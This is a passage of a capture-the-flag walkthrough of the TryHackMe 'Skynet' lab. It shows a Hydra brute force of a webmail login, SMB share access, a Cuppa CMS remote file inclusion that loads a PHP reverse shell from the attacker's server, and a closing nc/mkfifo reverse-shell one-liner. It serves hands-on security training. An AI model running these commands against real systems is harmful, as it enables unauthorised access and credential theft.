+getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og1.txt of size <span style="color:#ae81ff">471</span> as log1.txt <span style="color:#f92672">(</span>0.3 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.3 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> get log2.txt
+getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og2.txt of size <span style="color:#ae81ff">0</span> as log2.txt <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.2 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> get log3.txt
+getting file <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\l</span>og3.txt of size <span style="color:#ae81ff">0</span> as log3.txt <span style="color:#f92672">(</span>0.0 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\l</span>ogs<span style="color:#ae81ff">\&gt;</span> exit
+kali@kali:~/Documents/THM/skynet$ cat log1.txt 
+<span style="color:#f92672">{</span>list_of_possible_passwords_REDACTED<span style="color:#f92672">}</span>
+kali@kali:~/Documents/THM/skynet$ cat log2.txt
+kali@kali:~/Documents/THM/skynet$ cat log3.txt
+kali@kali:~/Documents/THM/skynet$ ls
+attention.txt  log1.txt  log2.txt  log3.txt  readme.md
+kali@kali:~/Documents/THM/skynet$ 
+
+</code></pre></div><p>We get a very interesting list of possible passwords? usernames? from the <strong>log1.txt</strong> file and as per the <strong>attention.txt</strong> we know the sysadmin requested all users to change passwords.</p>
+<p>if we visit the <strong>/squirrelmail</strong> URL we get a webmail login form, let&rsquo;s try our luck with hydra:</p>
+<p>We need to capture a login request, I used Burp but you can even when this directly from the Browser. The request gives us all we need to attempt to brute force our way into <strong>Squirrelmail</strong>.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">POST /squirrelmail/src/redirect.php HTTP/1.1
+Host: 10.10.180.3
+Content-Length: <span style="color:#ae81ff">75</span>
+Cache-Control: max-age<span style="color:#f92672">=</span><span style="color:#ae81ff">0</span>
+Upgrade-Insecure-Requests: <span style="color:#ae81ff">1</span>
+Origin: http://10.10.180.3
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/5.0 <span style="color:#f92672">(</span>Windows NT 10.0; Win64; x64<span style="color:#f92672">)</span> AppleWebKit/537.36 <span style="color:#f92672">(</span>KHTML, like Gecko<span style="color:#f92672">)</span> Chrome/84.0.4147.125 Safari/537.36
+Accept: text/html,application/xhtml+xml,application/xml;q<span style="color:#f92672">=</span>0.9,image/webp,image/apng,*/*;q<span style="color:#f92672">=</span>0.8,application/signed-exchange;v<span style="color:#f92672">=</span>b3;q<span style="color:#f92672">=</span>0.9
+Referer: http://10.10.180.3/squirrelmail/src/login.php
+Accept-Encoding: gzip, deflate
+Accept-Language: en-US,en;q<span style="color:#f92672">=</span>0.9
+Cookie: SQMSESSID<span style="color:#f92672">=</span>s9tj14ejoj4qcukfjbltigs9c4
+Connection: close
+
+login_username<span style="color:#f92672">=</span>test&amp;secretkey<span style="color:#f92672">=</span>test&amp;js_autodetect_results<span style="color:#f92672">=</span>1&amp;just_logged_in<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+</code></pre></div><p>Using the information from the request we form our command for <strong>hydra</strong>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form <span style="color:#e6db74">&#39;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown user or password incorrect&#39;</span>
+</code></pre></div><p>The attack result is the following:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet<span style="color:#f92672">]</span>
+└─$ hydra -l milesdyson -P log1.txt 10.10.136.30 http-post-form <span style="color:#e6db74">&#39;/squirrelmail/src/redirect.php:login_username=^USER^&amp;secretkey=^PASS^&amp;js_autodetect_results=1&amp;just_logged_in=1:F=Unknown user or password incorrect&#39;</span>
+Hydra v9.1 <span style="color:#f92672">(</span>c<span style="color:#f92672">)</span> <span style="color:#ae81ff">2020</span> by van Hauser/THC &amp; David Maciejak - Please <span style="color:#66d9ef">do</span> not use in military or secret service organizations, or <span style="color:#66d9ef">for</span> illegal purposes <span style="color:#f92672">(</span>this is non-binding, these *** ignore laws and ethics anyway<span style="color:#f92672">)</span>.
+
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> starting at 2020-08-25 18:06:16
+<span style="color:#f92672">[</span>WARNING<span style="color:#f92672">]</span> Restorefile <span style="color:#f92672">(</span>you have <span style="color:#ae81ff">10</span> seconds to abort... <span style="color:#f92672">(</span>use option -I to skip waiting<span style="color:#f92672">))</span> from a previous session found, to prevent overwriting, ./hydra.restore
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> max <span style="color:#ae81ff">16</span> tasks per <span style="color:#ae81ff">1</span> server, overall <span style="color:#ae81ff">16</span> tasks, <span style="color:#ae81ff">31</span> login tries <span style="color:#f92672">(</span>l:1/p:31<span style="color:#f92672">)</span>, ~2 tries per task
+<span style="color:#f92672">[</span>DATA<span style="color:#f92672">]</span> attacking http-post-form://10.10.136.30:80/squirrelmail/src/redirect.php:login_username<span style="color:#f92672">=</span>^USER^&amp;secretkey<span style="color:#f92672">=</span>^PASS^&amp;js_autodetect_results<span style="color:#f92672">=</span>1&amp;just_logged_in<span style="color:#f92672">=</span>1:F<span style="color:#f92672">=</span>Unknown user or password incorrect
+<span style="color:#f92672">[</span>80<span style="color:#f92672">][</span>http-post-form<span style="color:#f92672">]</span> host: 10.10.136.30   login: milesdyson   password: <span style="color:#f92672">{</span>PASSWORD_REDACTED<span style="color:#f92672">}</span>
+<span style="color:#ae81ff">1</span> of <span style="color:#ae81ff">1</span> target successfully completed, <span style="color:#ae81ff">1</span> valid password found
+Hydra <span style="color:#f92672">(</span>https://github.com/vanhauser-thc/thc-hydra<span style="color:#f92672">)</span> finished at 2020-08-25 18:06:38
+
+</code></pre></div><p>With this result we can answer the first question of the room. <strong>(milesdyson:{PASSWORD_REDACTED})</strong></p>
+<p>If we log into the email with Miles&rsquo; credentials, we see some emails:</p>
+<p><img src="https://i.imgur.com/ZCY4EJy.png" alt="Miles emails"></p>
+<p>It seems Miles&rsquo; password has been reset due to a system malfunction:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">We have changed your smb password after system malfunction.
+Password: <span style="color:#f92672">{</span>PASSWORD_REDACTED<span style="color:#f92672">}</span>
+</code></pre></div><p>We also see some other emails with binary information:</p>
+<p><img src="https://i.imgur.com/Ew19QQx.png" alt="Miles emails binary"></p>
+<p>We&rsquo;ll download a copy of this in case it comes in handy later on, the third and last email is also quite odd:</p>
+<p><img src="https://i.imgur.com/C0Va2rs.png" alt="Miles third email"></p>
+<p>I&rsquo;ve looked into that binary email and translates to some nonsense for now. Let&rsquo;s try to connect to that SMB as Miles, shall we?</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet<span style="color:#f92672">]</span>
+└─$ smbclient //10.10.136.30/milesdyson/ -U milesdyson                                                                                                                                                                      
+Enter WORKGROUP<span style="color:#ae81ff">\m</span>ilesdyson<span style="color:#960050;background-color:#1e0010">&#39;</span>s password: 
+Try <span style="color:#e6db74">&#34;help&#34;</span> to get a list of possible commands.
+smb: <span style="color:#ae81ff">\&gt;</span> dir
+  .                                   D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:47 <span style="color:#ae81ff">2019</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 23:51:03 <span style="color:#ae81ff">2019</span>
+  Improving Deep Neural Networks.pdf      N  <span style="color:#ae81ff">5743095</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
+  Natural Language Processing-Building Sequence Models.pdf      N <span style="color:#ae81ff">12927230</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
+  Convolutional Neural Networks-CNN.pdf      N <span style="color:#ae81ff">19655446</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
+  notes                               D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:18:40 <span style="color:#ae81ff">2019</span>
+  Neural Networks and Deep Learning.pdf      N  <span style="color:#ae81ff">4304586</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
+  Structuring your Machine Learning Project.pdf      N  <span style="color:#ae81ff">3531427</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:14 <span style="color:#ae81ff">2019</span>
+
+                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5369016</span> blocks available
+smb: <span style="color:#ae81ff">\&gt;</span> cd notes
+smb: <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\&gt;</span> dir
+  .                                   D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:18:40 <span style="color:#ae81ff">2019</span>
+  ..                                  D        <span style="color:#ae81ff">0</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:05:47 <span style="color:#ae81ff">2019</span>
+  3.01 Search.md                      N    <span style="color:#ae81ff">65601</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  4.01 Agent-Based Models.md          N     <span style="color:#ae81ff">5683</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.08 In Practice.md                 N     <span style="color:#ae81ff">7949</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  0.00 Cover.md                       N     <span style="color:#ae81ff">3114</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.02 Linear Algebra.md              N    <span style="color:#ae81ff">70314</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  important.txt                       N      <span style="color:#ae81ff">117</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:18:39 <span style="color:#ae81ff">2019</span>
+  6.01 pandas.md                      N     <span style="color:#ae81ff">9221</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  3.00 Artificial Intelligence.md      N       <span style="color:#ae81ff">33</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.01 Overview.md                    N     <span style="color:#ae81ff">1165</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  3.02 Planning.md                    N    <span style="color:#ae81ff">71657</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.04 Probability.md                 N    <span style="color:#ae81ff">62712</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.06 Natural Language Processing.md      N    <span style="color:#ae81ff">82633</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.00 Machine Learning.md            N       <span style="color:#ae81ff">26</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.03 Calculus.md                    N    <span style="color:#ae81ff">40779</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  3.03 Reinforcement Learning.md      N    <span style="color:#ae81ff">25119</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.08 Probabilistic Graphical Models.md      N    <span style="color:#ae81ff">81655</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.06 Bayesian Statistics.md         N    <span style="color:#ae81ff">39554</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  6.00 Appendices.md                  N       <span style="color:#ae81ff">20</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.01 Functions.md                   N     <span style="color:#ae81ff">7627</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.03 Neural Nets.md                 N   <span style="color:#ae81ff">144726</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.04 Model Selection.md             N    <span style="color:#ae81ff">33383</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.02 Supervised Learning.md         N    <span style="color:#ae81ff">94287</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  4.00 Simulation.md                  N       <span style="color:#ae81ff">20</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  3.05 In Practice.md                 N     <span style="color:#ae81ff">1123</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.07 Graphs.md                      N     <span style="color:#ae81ff">5110</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.07 Unsupervised Learning.md       N    <span style="color:#ae81ff">21579</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  2.05 Bayesian Learning.md           N    <span style="color:#ae81ff">39443</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  5.03 Anonymization.md               N     <span style="color:#ae81ff">2516</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  5.01 Process.md                     N     <span style="color:#ae81ff">5788</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.09 Optimization.md                N    <span style="color:#ae81ff">25823</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.05 Statistics.md                  N    <span style="color:#ae81ff">64291</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  5.02 Visualization.md               N      <span style="color:#ae81ff">940</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  5.00 In Practice.md                 N       <span style="color:#ae81ff">21</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  4.02 Nonlinear Dynamics.md          N    <span style="color:#ae81ff">44601</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.10 Algorithms.md                  N    <span style="color:#ae81ff">28790</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  3.04 Filtering.md                   N    <span style="color:#ae81ff">13360</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+  1.00 Foundations.md                 N       <span style="color:#ae81ff">22</span>  Tue Sep <span style="color:#ae81ff">17</span> 05:01:29 <span style="color:#ae81ff">2019</span>
+
+                <span style="color:#ae81ff">9204224</span> blocks of size 1024. <span style="color:#ae81ff">5368836</span> blocks available
+smb: <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\&gt;</span> get important.txt
+getting file <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\i</span>mportant.txt of size <span style="color:#ae81ff">117</span> as important.txt <span style="color:#f92672">(</span>0.1 KiloBytes/sec<span style="color:#f92672">)</span> <span style="color:#f92672">(</span>average 0.1 KiloBytes/sec<span style="color:#f92672">)</span>
+smb: <span style="color:#ae81ff">\n</span>otes<span style="color:#ae81ff">\&gt;</span> 
+
+
+</code></pre></div><p>once we connect to Miles&rsquo; SMB private share, we can see a file called <strong>important.txt</strong> which gives us some useful information:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">1. Add features to beta CMS /<span style="color:#f92672">{</span>URL_REDACTED<span style="color:#f92672">}</span>
+2. Work on T-800 Model <span style="color:#ae81ff">101</span> blueprints
+3. Spend more time with my wife
+</code></pre></div><p>This file let us answer some more questions.</p>
+<p>If we access the CMS URL mentioned in that note we get Miles&rsquo; personal page, some sort of about page:</p>
+<p><img src="https://i.imgur.com/UwK0SiJ.png" alt="Miles Personal Page"></p>
+<ul>
+<li>Note: I&rsquo;ll also keep a copy of Miles Picture, just in case there is something hidden on it.</li>
+</ul>
+<p>Since we know have discovered a weirdly named new directory, let&rsquo;s run <strong>goBuster</strong> on that to see if we get anything else under that path:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet<span style="color:#f92672">]</span>
+└─$ gobuster dir -u 10.10.136.30/<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 
+<span style="color:#f92672">===============================================================</span>
+Gobuster v3.0.1
+by OJ Reeves <span style="color:#f92672">(</span>@TheColonial<span style="color:#f92672">)</span> &amp; Christian Mehlmauer <span style="color:#f92672">(</span>@_FireFart_<span style="color:#f92672">)</span>
+<span style="color:#f92672">===============================================================</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Url:            http://10.10.136.30/<span style="color:#f92672">{</span>REDACTED<span style="color:#f92672">}</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Threads:        <span style="color:#ae81ff">40</span>
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Status codes:   200,204,301,302,307,401,403
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> User Agent:     gobuster/3.0.1
+<span style="color:#f92672">[</span>+<span style="color:#f92672">]</span> Timeout:        10s
+<span style="color:#f92672">===============================================================</span>
+2020/08/25 18:58:28 Starting gobuster
+<span style="color:#f92672">===============================================================</span>
+/administrator <span style="color:#f92672">(</span>Status: 301<span style="color:#f92672">)</span>
+
+</code></pre></div><p>After a little while, we get a partial result. There is an administration page that we can look at:</p>
+<p><img src="https://i.imgur.com/re6i8Bb.png" alt="CMS Login Page"></p>
+<p>Thanks to this login page, we get some details about the CMS version running. With that we can search for a possible exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ searchsploit cuppa
+---------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                          |  Path
+---------------------------------------------------------------------------------------- ---------------------------------
+Cuppa CMS - <span style="color:#e6db74">&#39;/alertConfigField.php&#39;</span> Local/Remote File Inclusion                         | php/webapps/25971.txt
+---------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+                                                                                                                          
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ locate php/webapps/25971.txt
+/usr/share/exploitdb/exploits/php/webapps/25971.txt
+                                                                                                                          
+┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~<span style="color:#f92672">]</span>
+└─$ subl /usr/share/exploitdb/exploits/php/webapps/25971.txt
+
+
+</code></pre></div><p>We see there is a RFI vulnerability that we could possibly exploit. Let&rsquo;s open the exploit to see what it does.
+It seems thre is that <strong>/alertConfigField.php</strong> that can be exploited by adding some payload to the URL:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">http://target/cuppa/alerts/alertConfigField.php?urlConfig<span style="color:#f92672">=[</span>FI<span style="color:#f92672">]</span>
+</code></pre></div><ul>
+<li>[FI] indicates we can add a File Inclusion here, since a bit of code in the <strong>/alertConfigField.php</strong> file would actually load files.</li>
+</ul>
+<p>We&rsquo;ll download a PHP reverse shell that we can use to get access to the machine:</p>
+<ul>
+<li><strong>Basic PHP Reverse Shell</strong>: Click <a href="http://pentestmonkey.net/tools/web-shells/php-reverse-shell">here</a> to download.</li>
+</ul>
+<p>The exploit only needs two values changed, our tun0 IP and Port:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">set_time_limit (0);
+$VERSION = &#34;1.0&#34;;
+$ip = &#39;10.13.0.34&#39;;  // CHANGE THIS
+$port = 2112;       // CHANGE THIS
+$chunk_size = 1400;
+$write_a = null;
+$error_a = null;
+$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;
+$daemon = 0;
+$debug = 0;
+</code></pre></div><ul>
+<li>More info on the port selected <a href="https://youtu.be/AZm1_jtY1SQ">here</a> :)</li>
+</ul>
+<p>Ok with the exploit ready let&rsquo;s fire up a python HTTP server to make it available:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">┌──<span style="color:#f92672">(</span>kali㉿kali<span style="color:#f92672">)</span>-<span style="color:#f92672">[</span>~/Documents/THM/skynet/php-reverse-shell-1.0<span style="color:#f92672">]</span>
+└─$ python -m SimpleHTTPServer 
+Serving HTTP on 0.0.0.0 port <span style="color:#ae81ff">8000</span> ...
+
+</code></pre></div><p>Now we need to create a netcat listener to hopefully get our reverse shell:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kali@kali:~$ nc -nlvp <span style="color:#ae81ff">2112</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2112</span> ...
+
+</code></pre></div><p>I think we are ready to try to load our payload using the URL:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/administrator/alerts/alertConfigField.php?urlConfig<span style="color:#f92672">=</span>http://10.13.0.34:8000/revShell.php?
+</code></pre></div><p>Once we run that URL on the Browser, we see our reverse shell is served and executed successfully:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">kali@kali:~$ nc -nlvp <span style="color:#ae81ff">2112</span>
+listening on <span style="color:#f92672">[</span>any<span style="color:#f92672">]</span> <span style="color:#ae81ff">2112</span> ...
+connect to <span style="color:#f92672">[</span>10.13.0.34<span style="color:#f92672">]</span> from <span style="color:#f92672">(</span>UNKNOWN<span style="color:#f92672">)</span> <span style="color:#f92672">[</span>10.10.136.30<span style="color:#f92672">]</span> <span style="color:#ae81ff">44250</span>
+Linux skynet 4.8.0-58-generic <span style="color:#75715e">#63~16.04.1-Ubuntu SMP Mon Jun 26 18:08:51 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux</span>
+ 18:32:05 up  2:12,  <span style="color:#ae81ff">0</span> users,  load average: 0.00, 0.00, 0.00
+USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
+uid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> gid<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span> groups<span style="color:#f92672">=</span>33<span style="color:#f92672">(</span>www-data<span style="color:#f92672">)</span>
+/bin/sh: 0: can<span style="color:#960050;background-color:#1e0010">&#39;</span>t access tty; job control turned off
+$ cd home
+$ ls
+milesdyson
+$ cd milesdyson
+$ dir
+backups  mail  share  user.txt
+$ cat user.txt
+<span style="color:#f92672">{</span>USER_FLAG_REDACTED<span style="color:#f92672">}</span>
+$ 
+
+</code></pre></div><p>With this access we should be able to read the user flag.</p>
+<p>To move forward with this privesc, we need to get some more information from the system.
+We put <strong>linPEAS.sh</strong> into our local HTTP server folder and using <strong>wget</strong> on the connected session we donwload it into the target machine.</p>
+<p>Looking at the report from linPEAS, we see a possible exploitation for the Linux Kernel:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">/usr/bin/pkexec         ---&gt;    Linux4.10_to_5.1.17<span style="color:#f92672">(</span>CVE-2019-13272<span style="color:#f92672">)</span>/rhel_6<span style="color:#f92672">(</span>CVE-2011-1485<span style="color:#f92672">)</span>
+</code></pre></div><p>We see we have a gcc exploit available <a href="https://github.com/jas502n/CVE-2019-13272">here</a></p>
+<p>However, if we check the cronjobs we can see there is a job running that we could try to exploit:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">$ cat /etc/crontab
+<span style="color:#75715e"># /etc/crontab: system-wide crontab</span>
+<span style="color:#75715e"># Unlike any other crontab you don&#39;t have to run the `crontab&#39;</span>
+<span style="color:#75715e"># command to install the new version when you edit this file</span>
+<span style="color:#75715e"># and files in /etc/cron.d. These files also have username fields,</span>
+<span style="color:#75715e"># that none of the other crontabs do.</span>
+
+SHELL<span style="color:#f92672">=</span>/bin/sh
+PATH<span style="color:#f92672">=</span>/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+<span style="color:#75715e"># m h dom mon dow user  command</span>
+*/1 *   * * *   root    /home/milesdyson/backups/backup.sh
+<span style="color:#ae81ff">17</span> *    * * *   root    cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.hourly
+<span style="color:#ae81ff">25</span> <span style="color:#ae81ff">6</span>    * * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.daily <span style="color:#f92672">)</span>
+<span style="color:#ae81ff">47</span> <span style="color:#ae81ff">6</span>    * * <span style="color:#ae81ff">7</span>   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.weekly <span style="color:#f92672">)</span>
+<span style="color:#ae81ff">52</span> <span style="color:#ae81ff">6</span>    <span style="color:#ae81ff">1</span> * *   root    test -x /usr/sbin/anacron <span style="color:#f92672">||</span> <span style="color:#f92672">(</span> cd / <span style="color:#f92672">&amp;&amp;</span> run-parts --report /etc/cron.monthly <span style="color:#f92672">)</span>
+
+</code></pre></div><p>let&rsquo;s see what this sh file is about:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">$ cat /home/milesdyson/backups/backup.sh
+<span style="color:#75715e">#!/bin/bash</span>
+cd /var/www/html
+tar cf /home/milesdyson/backups/backup.tgz *
+</code></pre></div><p>apparently this copies the whole HTML directory and somehow the wildcards passed to <strong>tar</strong> can be exploited&hellip;
+At this point my brain almost stopped working.</p>
+<p>This is from THMs post:</p>
+<p>Well, believe it or not, this creates a vulnerability as we can use it to  execute code. HelpNetSecurity best explains how this vulnerability works, but in essence, tar has wildcards and we can use checkpoint actions to execute commands.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-sh" data-lang="sh">echo <span style="color:#e6db74">&#34;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.13.0.34 2113 &gt;/tmp/f&#34;</span> &gt; shell.sh
